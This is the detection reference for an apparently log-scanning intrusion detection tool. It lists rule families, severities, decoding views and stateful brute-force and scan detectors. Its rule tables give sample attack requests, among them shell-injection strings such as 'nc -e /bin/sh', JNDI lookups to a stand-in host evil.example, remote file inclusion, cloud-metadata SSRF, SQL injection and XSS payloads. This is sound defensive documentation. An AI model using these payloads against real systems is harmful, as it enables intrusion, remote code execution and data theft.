# Detection reference

There are 139 rules in 11 families, plus three stateful detectors that run after the line-by-line pass. Rule IDs are stable and appear on the dashboard detail line, so a finding can be traced back to the rule that produced it.

| Family | Prefix | Rules | Severity |
| --- | --- | ---: | --- |
| Command injection | CMDI | 15 | 9-10 |
| Log4Shell | LOG4SHELL | 11 | 9-10 |
| Webshell | WEBSHELL | 10 | 9 |
| Local file inclusion | LFI | 11 | 8-9 |
| SQL injection | SQLI | 20 | 3-9 |
| Path traversal | TRAV | 12 | 5-9 |
| SSRF | SSRF | 9 | 2-9 |
| XSS | XSS | 13 | 4-6 |
| Sensitive file access | SENS | 16 | 2-6 |
| Reconnaissance | RECON | 14 | 2-4 |
| Malformed request | MALF, NULL, CRLF | 8 | 3-6 |
| **Total** | | **139** | |

| Stateful detector | Category | Severity |
| --- | --- | --- |
| BF-001 Authentication brute force | Brute Force | 7-9 |
| AUTH-001 Authentication failure burst | Brute Force | 4 |
| SCAN-001 Directory and endpoint enumeration | Reconnaissance | 5 |

Severity in these tables is the rule's base weight, 1 to 10. The dashboard score adds the HTTP status modifier and the per-IP multiplier on top. The README explains that math.

## How a rule matches

The engine can present a request in up to eight views, and each regex rule is compiled into one of four sets and scans only its own view:

- the raw target, still percent-encoded and lowercased
- the target decoded once, path and query, lowercased
- the target decoded twice, only when the second decode changes the string
- the target with SQL block comments stripped, a normalized view built only when the request carried one
- the User-Agent, lowercased
- the Referer, lowercased
- the User-Agent and Referer decoded once, only when percent escapes changed the value

The engine builds the double-decoded view only when the second decode changes the string, the comment-stripped view only when the target contains a block comment, and the header-decoded views only when a header carried escapes. Double decoding is how `%252e%252e%252f` becomes `../`. It never decodes a third time, so deeper encoding can slip past the decoded rules.

The comment-stripped view is why `UN/**/ION SEL/**/ECT` reads as `union select`. Versioned comments keep their live SQL: `/*!50000UNION*/` becomes `UNION`. A request without a block comment never builds this view.

SQLI-019, SQLI-020, XSS-012, XSS-013, TRAV-011 and TRAV-012 match attacker-controlled User-Agent and Referer values at lower severities, since those fields are rarely reflected server-side. The header rules see both the raw value and its percent-decoded form, so an encoded SQLi or XSS payload in a Referer still matches. LOG4SHELL-007 and LOG4SHELL-008 cover the same headers at severity 10, because a JNDI string in a header is worth reading.

Seven rules are custom checks rather than regexes: four structural checks for protocol, method, header CRLF and target length, two HTTP method checks for tracing and WebDAV, and the backup-extension check. Everything else is a regex compiled once at startup.

No rule inspects the request body. A payload that only exists in a POST body is invisible to this rule set.

## Command injection

15 rules, 9 to 10.

The 10s are direct execution shapes: a shell separator followed by a command, backticks, `$()`, an absolute shell path, `cmd.exe` or PowerShell, PHP's `system`/`exec`/`shell_exec` family, certutil or bitsadmin downloads, an encoded newline before a command, a pipe into a shell, netcat's `-e`, and a download piped into another command. The command list behind CMDI-001 covers `rm`, `shutdown`, `telnet`, `pkill` and the rest of the usual toolbox. The 9s are supporting tricks: `$IFS`, `chmod` or `chown` with a numeric mode, downloads into `/tmp` or `/dev/shm`, and `bash -c` or `sh -i`.

| ID | Rule | Sev | Example |
| --- | --- | ---: | --- |
| CMDI-001 | Shell metacharacter followed by a command | 10 | `?host=127.0.0.1;cat /etc/passwd` |
| CMDI-003 | `$()` command substitution | 10 | `?q=$(id)` |
| CMDI-004 | Absolute path to a shell binary | 10 | `?f=/bin/bash` |
| CMDI-007 | certutil / bitsadmin payload download | 10 | `?f=certutil -urlcache -f http://x` |
| CMDI-013 | Netcat execute flag | 10 | `?f=nc -e /bin/sh` |
| CMDI-015 | Shell invoked with `-c` | 9 | `?f=bash -c id` |

## Log4Shell

11 rules, 9 to 10.

Ten rules look for a JNDI lookup. Variants handle percent encoding, a bare `jndi:` without the `${}`, nested `${lower:${lower:jndi}}` games, `${env:...}` and `${sys:...}` lookups, an obfuscated lookup prefix, the same payload in User-Agent or Referer, and encoded nested forms. LOG4SHELL-010 covers the canonical `${${lower:j}ndi:rmi://...}` bypass, where the inner lookup resolves to `j` and leaves `jndi:` after the closing brace, so every contiguous-prefix rule misses it. LOG4SHELL-011 is a 9 and fires on any `${${` nest, even when no scheme resolves. These rules are narrow. If one fires, open the log line.

| ID | Rule | Sev | Example |
| --- | --- | ---: | --- |
| LOG4SHELL-001 | JNDI lookup in request target | 10 | `?x=${jndi:ldap://evil.example/a}` |
| LOG4SHELL-002 | Percent-encoded JNDI lookup | 10 | `?x=%24%7bjndi:rmi://evil.example/b%7d` |
| LOG4SHELL-004 | Nested lower/upper lookup obfuscation | 10 | `?x=${lower:${lower:jndi}}` |
| LOG4SHELL-005 | Log4j environment or system lookup | 10 | `?x=${env:AWS_SECRET_ACCESS_KEY}` |
| LOG4SHELL-007 | JNDI lookup in User-Agent | 10 | `${jndi:ldap://evil.example/c}` in UA |
| LOG4SHELL-008 | JNDI lookup in Referer | 10 | `${jndi:ldap://evil.example/d}` in Referer |
| LOG4SHELL-010 | Nested lookup resolving to a JNDI scheme | 10 | `?x=${${lower:j}ndi:rmi://evil/b}` |
| LOG4SHELL-011 | Nested Log4j lookup expression | 9 | `?x=${${upper:x}}` |

## Webshell

10 rules, all 9.

There are two kinds of signal. The first is known shell filenames and request parameters: c99, r57, wso, b374k, `?cmd=`, `?exec=`, and upload parameters with executable extensions. The second is an execution sink in the URL: `eval` over a decoder, `assert` over a superglobal, `preg_replace` with `/e`, Java `Runtime.exec`, ASP shell objects, and base64-looking command values.

WEBSHELL-004 requires a command-looking value: a shell utility name, an absolute path or a metacharacter. That keeps UI action parameters clean. `?cmd=download` and `?cmd=add-to-cart` do not fire; `?cmd=whoami`, `?cmd=/bin/sh` and `?cmd=cat%20/etc/passwd` do.

A webshell that lives in a file and never takes commands through the query string will not be detected here. This family catches probes and shells that accept commands in the URL.

| ID | Rule | Sev | Example |
| --- | --- | ---: | --- |
| WEBSHELL-001 | Known webshell filename | 9 | `/uploads/c99.php` |
| WEBSHELL-002 | `eval()` over an obfuscating decoder | 9 | `?f=eval(base64_decode(...))` |
| WEBSHELL-003 | `assert()` over a superglobal | 9 | `?f=assert($_POST['c'])` |
| WEBSHELL-004 | Command parameter in request | 9 | `?cmd=whoami` |
| WEBSHELL-009 | Upload parameter with an executable extension | 9 | `?upload=shell.php` |
| WEBSHELL-010 | Base64-looking command parameter | 9 | `?cmd=Y2F0IC9ldGMvcGFzc3dk` |

## Local file inclusion

11 rules, 8 to 9.

Stream wrappers (`php://`, `data://`, `expect://`, `phar://`, `zip://`), include-style parameters pointed at `/etc`, `/proc/self`, Windows system files, log files or web roots, percent-encoded wrappers, and remote includes. LFI-009, which spots parameters pointed at logs or web roots, is the one 8. The rest are 9.

| ID | Rule | Sev | Example |
| --- | --- | ---: | --- |
| LFI-001 | PHP stream wrapper | 9 | `?page=php://filter/convert.base64-encode/resource=index` |
| LFI-002 | Include-style parameter with a sensitive path | 9 | `?page=../../etc/passwd` |
| LFI-003 | Direct access to `/etc` | 9 | `/index.php?page=/etc/passwd` |
| LFI-004 | Access to `/proc/self` | 9 | `?path=/proc/self/environ` |
| LFI-007 | `expect://` wrapper | 9 | `?file=expect://id` |
| LFI-011 | Remote file inclusion | 9 | `?include=http://evil.example/x.txt` |

## SQL injection

20 rules, 3 to 9.

The core rules cover UNION SELECT, SELECT ... FROM, numeric and quoted tautologies, time-based functions (`SLEEP`, `pg_sleep`, `BENCHMARK`, `WAITFOR DELAY`), metadata enumeration, `INTO OUTFILE` and `DUMPFILE`, `LOAD_FILE`, error-based functions, destructive DDL, MSSQL extended procedures, a numeric literal followed by a comment, and stacked queries. Matching runs on a comment-stripped copy of the target as well, so `UN/**/ION SEL/**/ECT` is read as `union select`.

The newer low-severity rules catch scanner first requests: a numeric value closed with a quote (`1'`), a numeric value followed by a comment (`1--`, `1#`), and a numeric OR/AND tautology (`1 OR 2=2`). Those sit at 3 and 4 because a quote or a dash in a search box happens. SQLI-019 and SQLI-020 are the 6s for SQL indicators in User-Agent and Referer.

| ID | Rule | Sev | Example |
| --- | --- | ---: | --- |
| SQLI-001 | UNION SELECT injection | 9 | `?id=1 UNION SELECT username,password FROM users` |
| SQLI-004 | Quoted OR tautology | 9 | `?id=1' OR '1'='1` |
| SQLI-006 | Time-based injection function | 9 | `?id=1;sleep(5)` |
| SQLI-009 | INTO OUTFILE / DUMPFILE | 9 | `?q=1 into outfile '/var/www/x.php'` |
| SQLI-016 | Numeric parameter value closed with a quote | 3 | `?id=1'` |
| SQLI-017 | Numeric value followed by a comment | 4 | `?id=1--` |
| SQLI-018 | Numeric OR / AND tautology | 4 | `?id=1 OR 2=2` |
| SQLI-019 | SQL injection indicator in User-Agent | 6 | `sqlmap' UNION SELECT 1,2` in UA |
| SQLI-020 | SQL injection indicator in Referer | 6 | `?id=1' OR '1'='1` in Referer |

## Path traversal

12 rules, 5 to 9.

Raw `../` and `..\`, percent-encoded and double-encoded forms, `....//` collapse tricks, and traversal that lands in `/etc`, `/proc`, Windows directories or another sensitive root. Plain `../` is 7 because broken clients and badly generated links produce it too. Traversal into a sensitive directory or an encoded path into `/etc` is 9.

Two bypass shapes sit at 6. TRAV-009 catches `..;`, which some Java containers normalise to `..` even though it is not a real parent reference. TRAV-010 catches overlong UTF-8 (`%c0%ae`, `%c0%af`, `%c1%9c`) on the raw target, because decoding turns those bytes into U+FFFD and no `../` ever appears in the decoded view. TRAV-011 is a 5 for traversal in the Referer, and TRAV-012 does the same for the User-Agent.

| ID | Rule | Sev | Example |
| --- | --- | ---: | --- |
| TRAV-001 | Path traversal (`../`) | 7 | `/../../etc/passwd` |
| TRAV-002 | Path traversal (`..\`) | 7 | `/..\..\windows\win.ini` |
| TRAV-003 | Percent-encoded path traversal | 7 | `?file=..%2f..%2fetc%2fpasswd` |
| TRAV-004 | Double-encoded path traversal | 8 | `?file=%252e%252e%252fetc/passwd` |
| TRAV-005 | Obfuscated traversal (`....//`) | 8 | `/....//....//etc/passwd` |
| TRAV-007 | Direct access to a sensitive system path | 9 | `/etc/passwd` |
| TRAV-009 | Traversal with a path-parameter separator | 6 | `/..;/WEB-INF/web.xml` |
| TRAV-010 | Overlong UTF-8 traversal encoding | 6 | `/..%c0%af..%c0%afetc/passwd` |
| TRAV-011 | Path traversal in Referer | 5 | `http://evil.example/../../etc/passwd` in Referer |
| TRAV-012 | Path traversal in User-Agent | 5 | `../../etc/passwd` in UA |

## SSRF

9 rules, 2 to 9.

The high scores come from rules that look at the host as well as the parameter name. Loopback and private-network hosts are 7, cloud metadata endpoints are 9, dangerous schemes and internal service ports are 8, obfuscated loopback forms are 8, and a host parameter pointing at an internal address is 8. SSRF-002 is a 3 for a scheme-relative `//host` value in a fetch-shaped parameter.

SSRF-001 is the informational one at 2. It only fires when a fetch-shaped parameter carries an absolute URL whose host is an IP literal or a dotless name. A normal checkout, OAuth or CDN link no longer scores. A request that aims `?url=` at `10.0.0.5` gets SSRF-001, SSRF-004 and SSRF-009 on the same line, and the host-aware rules are the ones that carry weight.

SSRF-001 and SSRF-002 do not try to resolve the destination. They see the shape of the parameter and flag it at low weight. A protocol-relative partner link in `next` or `return_url` is not treated as an SSRF parameter.

| ID | Rule | Sev | Example |
| --- | --- | ---: | --- |
| SSRF-001 | URL-fetch parameter pointing at an IP or dotless host | 2 | `?url=http://metadata/` |
| SSRF-002 | URL parameter with a scheme-relative URL | 3 | `?url=//cdn.example.com/image.png` |
| SSRF-003 | Loopback host in a URL | 7 | `?url=http://127.0.0.1:8080/admin` |
| SSRF-004 | Private network host in a URL | 7 | `?url=http://192.168.1.1/` |
| SSRF-005 | Cloud metadata endpoint | 9 | `?url=http://169.254.169.254/latest/meta-data/` |
| SSRF-006 | Dangerous URL scheme | 8 | `?dest=gopher://127.0.0.1:6379/_INFO` |
| SSRF-009 | Host parameter pointing at an internal address | 8 | `?host=169.254.169.254` |

## XSS

13 rules, 4 to 6.

Script tags and their close sequences, percent-encoded tags, inline event handlers, `javascript:` URIs, SVG onload, iframes with script payloads, CSS `expression()`, DOM access, and `alert(document.cookie)`. The handler rule covers pointer and touch events (`onpointerdown`, `ontouchstart`) as well as mouse, keyboard, focus, drag and transition handlers. XSS-012 and XSS-013 cover script payloads in User-Agent and Referer at 4.

These weights are lower than the RCE families because reflected markup shows up in logs constantly and usually dies at the template layer. Correlation still lifts a burst of different XSS probes.

| ID | Rule | Sev | Example |
| --- | --- | ---: | --- |
| XSS-001 | Script tag injection | 5 | `?q=<script>alert(1)</script>` |
| XSS-003 | Percent-encoded script tag | 5 | `?q=%3Cscript%3Ealert(1)%3C/script%3E` |
| XSS-004 | Inline event handler | 5 | `?q=<img src=x onerror=alert(1)>` |
| XSS-005 | `javascript:` URI | 5 | `?q=javascript:alert(1)` |
| XSS-008 | Cookie theft via `alert(document.cookie)` | 6 | `?q=javascript:alert(document.cookie)` |
| XSS-011 | CSS `expression()` payload | 6 | `?q=<div style="width:expression(alert(1))">` |
| XSS-012 | Script payload in User-Agent | 4 | `<script>alert(1)</script>` in UA |

## Sensitive file access

16 rules, 2 to 6.

VCS metadata, `.env` files, SSH keys and `authorized_keys`, cloud and tool credentials, WordPress and framework configs, config backups, SQL dumps, phpinfo pages, `.htaccess`, IIS and Java descriptors, `.DS_Store`, CI definitions, shell history, private keys outside `.ssh`, and editor backups. A 404 for `.env` is background noise, which is why the weights are low. A 200 on `.ssh/id_rsa` puts the SENS-004 event at 7.5 before any correlation, which is the point of scoring status separately from the rule.

SENS-015 is the custom check in this family. It looks at the path and query for backup suffixes such as `.bak`, `.old`, `.save` and `.swp` rather than matching a fixed filename.

| ID | Rule | Sev | Example |
| --- | --- | ---: | --- |
| SENS-001 | Environment file | 5 | `/.env` |
| SENS-002 | Git metadata file | 5 | `/.git/config` |
| SENS-004 | SSH private key or key material | 6 | `/.ssh/id_rsa` |
| SENS-006 | WordPress configuration | 6 | `/wp-config.php` |
| SENS-012 | macOS `.DS_Store` metadata | 2 | `/.DS_Store` |
| SENS-015 | Editor or backup copy of a file | 4 | `/wp-config.php.bak` |
| SENS-016 | Private key file outside `.ssh` | 6 | `/backup/id_rsa` |

## Reconnaissance

14 rules, 2 to 4.

Exposed status and admin surfaces, Spring Boot actuator, Swagger and OpenAPI, GraphQL, phpMyAdmin and Adminer, WordPress endpoints, Jenkins, Solr, Grafana and Prometheus, `security.txt`, CGI directories, known scanner user agents, and dangerous HTTP methods. The weights are low because every public server gets this traffic. The value is in the volume and in SCAN-001, not in a single probe.

The method checks are custom: TRACE, TRACK, DEBUG and CONNECT are RECON-014; PROPFIND, PROPPATCH and MKCOL are RECON-015.

| ID | Rule | Sev | Example |
| --- | --- | ---: | --- |
| RECON-001 | security.txt probe | 2 | `/.well-known/security.txt` |
| RECON-002 | Apache server status endpoint | 4 | `/server-status?auto` |
| RECON-003 | Spring Boot actuator endpoint | 4 | `/actuator/env` |
| RECON-007 | Database admin interface | 4 | `/phpmyadmin/` |
| RECON-012 | Known vulnerability scanner user agent | 4 | `Nikto/2.5.0` in UA |
| RECON-014 | Cross-site tracing or tunnelling method | 4 | `TRACE / HTTP/1.1` |

## Malformed requests

8 rules, 3 to 6.

Encoded and decoded null bytes, encoded and decoded CRLF, an unrecognized protocol token, a malformed method token, CRLF inside User-Agent or Referer, and targets longer than 4096 bytes. Most of these come from broken clients. Null bytes and header injection are the two I actually read.

| ID | Rule | Sev | Example |
| --- | --- | ---: | --- |
| NULL-001 | Encoded null byte in request target | 5 | `/index.php%00.jpg` |
| NULL-002 | Decoded null byte in request target | 5 | A real NUL after decoding |
| CRLF-001 | Encoded CRLF sequence in request target | 5 | `?x=%0d%0aSet-Cookie:a=b` |
| CRLF-002 | Decoded CRLF sequence in request target | 5 | A real CRLF after decoding |
| MALF-001 | Unrecognised HTTP protocol token | 5 | `HTTP/9.9` |
| MALF-002 | Malformed HTTP method token | 6 | `G@T` in the method field |
| MALF-003 | CRLF injection in a request header | 5 | A newline in UA or Referer |
| MALF-004 | Excessively long request target | 3 | A target over 4096 bytes |

## Stateful detectors

### BF-001 Authentication brute force

This runs after the line pass over the retained 401/403/404 records. A 401 or 403 counts as a failed login only when the path contains a login or admin hint: `login`, `log-in`, `signin`, `sign-in`, `auth`, `session`, `wp-login`, `wp-admin`, `admin`, `api/token`, `token` or `oauth`. A 401 on a plain API endpoint is usually an expired token, so it goes to AUTH-001 instead of inflating this detector.

For each IP, the detector finds the peak number of login failures inside `--window` seconds. If that peak reaches `--threshold`, it emits one event for the IP. Severity is `min(6 + peak / threshold, 9)`. With the default threshold of 20, 45 failed logins in a window give severity 8. The evidence reads `45 failed logins in 300s (peak window)`, and the event points at the first record of the peak window.

### AUTH-001 Authentication failure burst

This uses the same retained records with a different filter: 401 responses on paths that do not contain a login hint. Threshold and window are the same as BF-001, and the result is one event per offending IP at a fixed severity of 4. The evidence reads `30 failed authentication responses in 300s from non-login endpoints`.

The split keeps a broken client or a token probe against an API from looking like a password guess against a login form. Both land in the Brute Force category, so the category count still tells you an IP is failing auth a lot, but only BF-001 reaches the 7 to 9 range.

### SCAN-001 Directory and endpoint enumeration

This uses the same retained records but counts distinct path-only 404/403 responses per IP inside the window. The query string is ignored, so `/p?id=1` and `/p?id=2` count as one path. Page assets are excluded: paths ending in `.css`, `.js`, `.mjs`, `.png`, `.jpg`, `.jpeg`, `.gif`, `.svg`, `.webp`, `.avif`, `.bmp`, `.ico`, `.woff`, `.woff2`, `.ttf`, `.otf`, `.eot` or `.map`. A 403 burst on images and fonts is usually signed-URL expiry or hotlink protection, not enumeration.

It fires when the peak reaches `max(--threshold, 25)` distinct paths. At the default threshold of 20 that is 25 distinct paths. Severity is fixed at 5, and the evidence reads `40 distinct 404/403 paths in 300s (peak window)`.

Each detector emits at most one event per IP, and events are sorted by source IP. They feed the same ranking and category counts as the line rules.

The stateful pass has its own fixed retention, separate from `--max-events`: 400,000 auth-failure records (401/403) and 100,000 404 probe records. The split means a flood of missing assets cannot evict the 401s and 403s that BF-001 and AUTH-001 need. If either budget binds, the dashboard prints a warning.

## Reading the evidence

A dashboard detail line looks like this:

```
Authentication brute force (BF-001) · 28 failed logins in 300s (peak window) · base 7.00
```

The first part is the rule name and ID, then the evidence, then the base score. When the pieces fit in the 92-column detail width, `multiplier xN` and the boost reason follow, for example `multiplier x2.50 · 11 distinct rules within 300s from 45.13.2.9`. Long evidence excerpts push those last fields off the right edge; the score itself is unchanged.

For regex rules, the evidence is the pattern slug and a short excerpt of the field that matched. Custom checks write a short sentence instead. Excerpts are capped at 120 characters and control characters are replaced before printing, so a hostile User-Agent cannot move the cursor or recolor the terminal.

## Where the rules live

Each family is a module under `src/detection/` with a `SPECS` array of `RuleSpec` values. `RuleSpec::target` matches the decoded path and query, `raw` matches the still-encoded target, `user_agent` and `referer` match those headers, and `custom` is for checks that need code. The engine builds one matcher from all families at startup.

If you add a rule, the unit test `rule_metadata_is_consistent` enforces a unique, family-prefixed ID and a severity from 1 to 10. The debug build also rejects duplicate IDs when the engine is constructed.

## Limits of the rule set

- Regex rules match shapes, not intent. Novel encodings, unusual separators and application-specific parameters can get through.
- Only the target, User-Agent and Referer are inspected. Request bodies and response bodies are not available.
- Two decode passes is the ceiling. Triple-encoded payloads will not reach their final form for the decoded rules.
- URL parameter heuristics are still broad in one place. SSRF-002 tags scheme-relative `//host` values in fetch parameters at severity 3, and SSRF-001 tags a fetch parameter aimed at an internal IP literal at severity 2. The host-aware rules carry the real weight.
- There is no per-rule allowlist or disable switch in this version. If a rule is noise on your traffic, you have to edit its pattern or ignore that row.
- A single rule hit is weak evidence. Read the payload and the status before acting on it. The score orders the list; it does not prove an attack succeeded.
